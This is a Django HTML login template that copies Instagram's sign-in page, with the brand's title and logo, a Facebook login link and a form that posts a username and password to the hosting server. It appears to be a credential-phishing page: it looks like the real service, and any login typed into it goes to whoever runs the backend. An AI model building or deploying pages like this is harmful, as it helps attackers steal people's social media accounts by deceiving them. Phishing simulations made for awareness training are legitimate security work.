
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">

  <!-- Login Form Container -->
  <div class="container d-flex justify-content-center align-items-center vh-100">
    <div class="card shadow-sm border-light p-4" style="width: 350px;">
      <!-- Instagram Logo -->
      <div class="text-center mb-4">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1ZIpl6FzdyTQ2TmxqTcdpzlTYxWrUOf0MEg&s" alt="Instagram Logo" style="width: 175px;">
      </div>

      <!-- Form -->
      <form  method="post">
        {% csrf_token %}
        <div class="mb-3">
          <input type="text" class="form-control" placeholder="Phone number, username, or email" name="id" required >
        </div>
        <div class="mb-3">
          <input type="password" class="form-control" placeholder="Password"  name="pass" required >
        </div>
        <button type="submit" class="btn btn-primary w-100 mb-3">Log in</button>
      </form>

      <!-- OR Divider -->
      <div class="text-center text-muted mb-3">OR</div>

      <!-- Facebook Login -->
      <div class="text-center mb-3">
        <a href="#" class="text-decoration-none text-primary fw-bold">
          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo" width="20" height="20" class="me-1">
          Log in with Facebook
        </a>
      </div>

      <!-- Forgot Password -->
      <div class="text-center">
        <a href="#" class="text-decoration-none text-muted">Forgot password?</a>
      </div>
    </div>
  </div>

  <!-- Sign Up Section -->
  <div class="container text-center mt-3">
    <p class="text-muted">Don't have an account? <a href="#" class="text-primary fw-bold">Sign up</a></p>
  </div>

  <!-- Bootstrap Bundle JS (Optional) -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
